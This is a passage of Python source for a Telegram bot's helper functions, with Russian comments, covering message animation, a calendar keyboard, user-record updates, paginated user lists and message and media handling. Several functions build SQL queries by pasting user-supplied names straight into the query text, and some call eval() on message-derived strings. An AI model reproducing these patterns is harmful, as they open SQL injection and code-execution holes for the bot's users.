    deli = round(len(param) / 4)
    k = 0
    res = ''
    for i in param:
        k += 1
        if k <= deli or k > deli * 3:
            res += i
        else:
            res += '*'
    return res


async def check_link(text):
    if re.search(r'^https?://(www\.)?[-a-zA-Z0-9]+\.[-a-zA-Z0-9]+.*$', text):
        return True
    else:
        return

# await text_animation(answer, 'points', speed)
async def text_animation(answer, param, speed=0.5):# speed = пауза в секундах между изменениями
    t = threading.Thread(target=text_animation2, args=(answer, param, speed))
    t.start()


def text_animation2(answer, param, speed): # speed = пауза в секундах
    i = 0
    if param == 'timer':
        timer = "🕐🕑🕒🕓🕔🕕🕖🕗🕘🕙🕚🕛"
        max = len(timer) - 1
        for t in range(0, 100):
            time.sleep(speed)
            text_new = answer['text'].replace('🕛', timer[i])
            i += 1
            if i >= max:
                i = 0
            try:
                data = {'chat_id': answer['chat']['id'], 'text': text_new, 'message_id': answer['message_id']}
                res = requests.post(f"https://api.telegram.org/bot{TOKEN['telegram_bot']}/editMessageText", data=data)
                res = json.loads(res.content)
                if not res['ok']:
                    break
            except Exception as ex:
                break
    elif param == 'points':
        arr = [' .', ' . .', ' . . .', '']
        for t in range(0, 120):
            time.sleep(speed)
            text_new = f"{answer['text']}{arr[i]}"
            try:
                data = {'chat_id': answer['chat']['id'], 'text': text_new, 'message_id': answer['message_id']}
                res = requests.post(f"https://api.telegram.org/bot{TOKEN['telegram_bot']}/editMessageText", data=data)
                res = json.loads(res.content)
                if not res['ok']:
                    break
            except Exception as ex:
                break
            i += 1
            if i >= len(arr):
                i = 0


# new_worker = await load_get_chat(customer)  # обновление данных о юзере username first_name last_name
async def load_get_chat(customer): # customer - строка юзера из БД
    res = False
    try:
        res = await bot.get_chat(customer['user_id'])# подгружаем данные юзера из телеги
    except Exception as ex:
        res = False
    if res:
        customer['first_name'] = res['first_name'] if 'first_name' in res else ''
        customer['last_name'] = res['last_name'] if 'last_name' in res else ''
        customer['username'] = res['username'] if 'username' in res else ''
        cur.execute("UPDATE users SET username = '{}', first_name = '{}', last_name = '{}' WHERE user_id = '{}'".format(customer['username'], customer['first_name'], customer['last_name'], customer['user_id']))
    return customer

async def update_user(tg_user, user): # tg_user - из tg.from_iser | user - то что в state
    dop_sql = ""
    if 'last_name' in tg_user:
        tg_user['last_name'] = tg_user['last_name'].replace("'", '`').replace("<", '«').replace(">", '»')
        if tg_user['last_name'] != user['last_name']:
            if dop_sql:
                dop_sql += ", "
            dop_sql += f" last_name = '{tg_user['last_name']}' "
            user['last_name'] = tg_user['last_name']
    if 'first_name' in tg_user:
        tg_user['first_name'] = tg_user['first_name'].replace("'", '`').replace("<", '«').replace(">", '»')
        if tg_user['first_name'] != user['first_name']:
            if dop_sql:
                dop_sql += ", "
            dop_sql += f" first_name = '{tg_user['first_name']}' "
            user['first_name'] = tg_user['first_name']
    if 'username' in tg_user:
        if tg_user['username'] != user['username']:
            if dop_sql:
                dop_sql += ", "
            dop_sql += f" username = '{tg_user['username']}' "
            user['username'] = tg_user['username']
    if dop_sql:
        cur.execute("UPDATE users SET {} WHERE id = '{}'".format(dop_sql, user['id']))
    return user

async def calendar(active, button, period=False, types="period", limit=6):
    # active активное число от которого показываем, now - сегодня, 2024-05-24 если надо с определенного
    # period = ['prew', 'now', 'next'] - какие даты в календаре показывать, прошлое, настоящее число, будущие
    # button подпись callback_data у кнопок
    # types = period/month , где period показывает ограниченый период limit, а month показывает только активный месяц
    # limit # сколько еще недель вперед назад показывать
    if not period:
        period = ['prew', 'now', 'next']
    if active == 'now':
        # datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        day = datetime.datetime.now().strftime("%d")
        month = datetime.datetime.now().strftime("%m")
        year = datetime.datetime.now().strftime("%Y")
        active = f"{year}-{month}-{day}"
    else:
        active_arr = active.split('-')
        day = int(active_arr[2])
        month = int(active_arr[1])
        year = int(active_arr[0])
    day = int(day)
    month = int(month)
    year = int(year)
    day_week = datetime.datetime.weekday(datetime.datetime(year, month, day))
    info_day_in_month = {1: 31, 2: 28, 3: 31, 4: 30, 5: 31, 6: 30, 7: 31, 8: 31, 9: 30, 10: 31, 11: 30, 12: 31}
    info_month = ["", "Январь", "Февраль", "Март", "Апрель", "Май", "Июнь", "Июль", "Август", "Сентябрь", "Октябрь", "Ноябрь", "Декабрь"]
    if not year % 4: # если высокосный год, то в феврале 29 дней
        info_day_in_month[2] = 29
    day_write = 1
    if 'prew' not in period:
        day_write = day - day_week
    month_write = month
    year_write = year
    but = []
    if types == "period":
        month_finish = False
        mount_new_day_week = -1
        mount_new_day_week_old = -1
        for i_w in range(0, limit): #  недель назначено в limit
            but_line = []
            if not i_w:
                but.append([{'text': f"{info_month[month_write]} {year_write}", 'callback_data': "bot_not"}])
            if month_finish:
                mount_new_day_week_old = mount_new_day_week
                mount_new_day_week = -1
                month_finish = False
                day_write = 1
                month_write += 1
                if month_write == 13:
                    month_write = 1
                    year_write += 1
                but.append([{'text': f"{info_month[month_write]} {year_write}", 'callback_data': "bot_not"}])
            for i_d in range(0, 7): # 7 дней в одной недели
                if month_write == month:
                    if (day > day_write and 'now' in period) or (day >= day_write and 'now' not in period):
                        but_line.append({'text': f"➖", 'callback_data': "bot_not"})
                    elif day_write > info_day_in_month[month_write]:
                        but_line.append({'text': f"➖", 'callback_data': "bot_not"})
                        month_finish = True
                        if mount_new_day_week < 0:
                            mount_new_day_week = i_d if i_d < 6 else 0
                    else:
                        but_line.append({'text': day_write, 'callback_data': f"{button}_{year_write}-{month_write}-{day_write}"})
                    day_write += 1
                else:
                    if mount_new_day_week_old >= 0 and i_d < mount_new_day_week_old:
                        but_line.append({'text': f"➖", 'callback_data': "bot_not"})
                    else:
                        if mount_new_day_week_old >= 0:
                            mount_new_day_week_old = -1
                        if day_write > info_day_in_month[month_write]:
                            but_line.append({'text': f"➖", 'callback_data': "bot_not"})
                            month_finish = True
                            if mount_new_day_week < 0:
                                mount_new_day_week = i_d if i_d < 6 else 0
                        else:
                            but_line.append({'text': day_write, 'callback_data': f"{button}_{year_write}-{month_write}-{day_write}"})
                        day_write += 1

            but.append(but_line)
    # print(f'===== calendar =====')
    # print(but)
    # print(f'===== calendar =====')
    return but


async def user_name(row, get):
    if 'first_name' not in row:
        row['first_name'] = ''
    if 'last_name' not in row:
        row['last_name'] = ''
    if 'username' not in row:
        row['username'] = ''
    name = ""
    if get == 'link':
        name = f"{row['first_name']} {row['last_name']}".strip()
        if not name:
            name = row['user_id']
        name = f"<a href='tg://user?id={row['user_id']}'>{name}</a>"
        if row['username']:
            name += f" @{row['username']}"
    return name



async def userList(tg, state, page=False,limit=25, sql_where=""):
    # page="payTime_userList" назначает принудительный путь для кнопок, нужно использовать если не просто листалка, а еще есть какие то кнопки
    user_list = []
    kb = []
    cb = False
    if 'data' in tg:
        button = tg.data.split('_')
    if page: # если написали сообщение
        cb = page.split('_')
        if 'button' in locals():
            if button[0] == cb[0] and button[1] == cb[1]:
                cb = button
    elif 'button' in locals():
        cb = button
    if cb:
        async with state.proxy() as data:
            data_param = f'{cb[0]}_userList'
            if data_param not in data:
                data[data_param] = 0
            if len(cb) > 2:
                if cb[2] == 'prew':
                    data[data_param] -= 1 if data[data_param] > 0 else 0
                elif cb[2] == 'next':
                    data[data_param] += 1
            # текст
            offset = round(limit * data[data_param])
            if sql_where:
                sql_where_dop = f" WHERE {sql_where} "
            last_id = 0
            cur.execute("SELECT * FROM users {} ORDER BY id LIMIT {} OFFSET {}".format(sql_where_dop, limit, offset))
            for row in cur.fetchall():
                user_list.append(dict(row))
                last_id = row['id']
            # Кнопки
            if data[data_param] > 0:
                kb.append({'text': "<< ПРЕДЫДУЩИЕ", 'callback_data': f"{cb[0]}_{cb[1]}_prew"})
            if sql_where:
                sql_where_dop = f" AND {sql_where} "
            cur.execute("SELECT COUNT(*) FROM users WHERE id > {} {}".format(last_id, sql_where_dop))
            if cur.fetchall()[0]['count']:
                kb.append({'text': "СЛЕДУЮЩИЕ >>", 'callback_data': f"{cb[0]}_{cb[1]}_next"})
    return {'list': user_list, 'but': kb}


###############################################################
################### принятие сообщения ########################
###############################################################

# превращаем сообщение которое получили от юзера, в нужно, с параметрами запрета
# await message_load(tg) # button запрет кнопок | file запрет файлов | media запрет галереи(если есть кнопки) | ent запрет разметки
async def message_load(tg, button=True, file=True, media=True, ent=True):
    # button - разрешены ли кнопки
    # file - разрешены ли файлы картинки видео по одной и в том числе галереей
    # media - разрешена ли галерея
    # ent - Запрет entities
    mes = {}
    # ======= ТЕКСТ И ФАЙЛЫ
    if 'text' in tg:
        mes['text'] = tg['text']
        if ent and 'entities' in tg:
            mes['ent'] = tg['entities']
            for i in mes['ent']:
                if i['type'] in ['text_link', 'url']:
                    text_link = True
            if 'text_link' in locals():
                mes['prev'] = 0
    else:
        if 'caption' in tg:
            mes['text'] = tg['caption']
            if ent and 'caption_entities' in tg:
                mes['ent'] = tg['caption_entities']
        if file:
            if 'media_group_id' in tg:
                mes['media_group_id'] = tg['media_group_id']
                file_info = await file_load(tg) # узнаем тип файла и ID
                mes['media'] = [{'type': file_info['file_type'], 'media': file_info['file_id']}]
                if not media: # в дальнейшем заблокирует сообщение в message_edit()
                    mes['error'] = "🚫 Отправка галереи запрещена"
            else:
                file_info = await file_load(tg) # узнаем тип файла и ID
                if file_info:
                    mes[file_info['file_type']] = file_info['file_id']
    if 'text' in mes:
        if mes['text']:
            mes['text'] = mes['text'].replace("<", "«").replace(">", "»").replace("'", "`")
            if mes['text'][:1] == '@':
                mes['text'] = f"❌{mes['text'][1:]}"
            if 'ent' in mes:
                mes['ent'] = eval(str(mes['ent']).replace("'", '"').replace("<MessageEntity ", '').replace(">", ''))
                if mes['ent'] and ('%ИМЯ%' in mes['text'] or '%имя%' in mes['text'] or '%РЕФКА%' in mes['text'] or '%РЕФКАОТЧЕТ%' in mes['text']):
                    mes.pop('ent')
    if button and 'media_group_id' not in mes: # если кнопки нужно сохранить
        if 'reply_markup' in tg: # если прислали кнопки, то заменем
            mes['but'] = []
            res_kb = tg['reply_markup']["inline_keyboard"]
            for one in res_kb:
                kb_arr = []
                for two in one:
                    kb_arr.append({"text": two["text"], "url": two["url"]})
                mes['but'].append(kb_arr)
    return mes


async def file_load(mes): # узнаем тип файла и ID
    if 'photo' in mes:
        file_type = 'photo'
    elif 'video' in mes:
        file_type = 'video'
    elif 'audio' in mes:
        file_type = 'audio'
    elif 'voice' in mes:
        file_type = 'voice'
    elif 'video_note' in mes:
        file_type = 'video_note'
    elif 'document' in mes:
        file_type = 'document'
    elif 'sticker' in mes:
        file_type = 'sticker'
    if file_type:
        file_id = mes[file_type][-1]['file_id'] if file_type == 'photo' else mes[file_type]['file_id']
        return {'file_type': file_type, 'file_id': file_id}
    return False


async def message_edit(tg, state, mes_new, mes_old={}, state_name=False, setting_name=False): # СТАРОЕ ИЗБАВИТЬСЯ ВЕЗДЕ module save
    # state_name - чтобы данные сохранить в state, и return обратно, для сохранения в БД
    # setting_name - чтоб сохранить сразу в setting_name (без временных файлов), mes_old можно не слать
    if not state_name and not setting_name:
        print("Ошибка в функции message_edit(), не нашли параметр state_name или setting_name")
        return False
    mes = {}
    if not mes_old: # Если нет прислали сообщения в mes_old, загружаем
        if state_name:
            async with state.proxy() as data:
                if state_name not in data:
                    data[state_name] = {}
                mes_old = data[state_name]
        elif setting_name:
            save = await saver()
            mes_old = eval(save['setting'][setting_name])
    # проверка на медиа
    mes_new_media = mes_new['media_group_id'] if 'media_group_id' in mes_new else False
    mes_old_media = mes_old['media_group_id'] if 'media_group_id' in mes_old else 'NOT'
    if mes_new_media == mes_old_media: # медиа, из одной группы
        if 'error' in mes_new: # если попали на запрет отправки галереи
            mes = {'text': mes_new['error']}
        else:
            mes = mes_old
            mes['media'] = mes_old['media'] + mes_new['media']
    else: # простые сообщения или медиа с разных групп
        mes = mes_new
        if 'but' not in mes_new and 'but' in mes_old and not mes_new_media: # Если были кнопки и нет кнопок, оставляем старые
            mes['but'] = mes_old['but']
    # сохраняем сообщение
    if state_name:
        async with state.proxy() as data:
            data[state_name] = mes
    elif setting_name:
        save = await saver('replace', {"setting": {setting_name: mes}})
    # если галерея, то первый файл заставляем ждать остальных
    if mes_new_media: # 'media_group_id' in mes:
        await tg_delete(tg.from_user.id, tg.message_id)
        if mes_old_media != 'NOT': # 'media_group_id' in mes_old:
            # if mes_old['media_group_id'] == mes['media_group_id']:
            if mes_new_media == mes_old_media:
                return False
        answer = await send(tg, {'text': '⏳ Загрузка галерии, ожидайте'})
        i = 0
        while i < 3:
            i += 1
            answer = await send(tg, {'text': f'⏳ Загрузка галерии, ожидайте{i * " ."}', 'message_id': answer.message_id})
            await asyncio.sleep(1)
        await tg_delete(tg.from_user.id, answer.message_id)
    if state_name:
        async with state.proxy() as data:
            mes = data[state_name]
    elif setting_name:
        mes = eval(save['setting'][setting_name])
    return mes

# ПРИМЕРЫ использования загрузки сообщений

# ====== добавление в таблицу setting сразу, без временного изменения ======
# mes_new = await message_load(tg) # button запрет кнопок | file запрет файлов | media запрет галереи(если есть кнопки) | ent запрет разметки
# if not await message_edit(tg, state, mes_new, setting_name="bot_message_main"): # mes_old, state_name, setting_name
#     return False  # если грузили галерею, то только первое сообщение пропустим, остальные тормознем

# ====== сохранение в state для временного изменения до сохранения ======
# mes_new = await message_load(tg) # button запрет кнопок | file запрет файлов | media запрет галереи(если есть кнопки) | ent запрет разметки
# if not await message_edit(tg, state, mes_new, state_name="bot_qwerty"): # mes_old, state_name, setting_name
#     return False  # если грузили галерею, то только первое сообщение пропустим, остальные тормознем
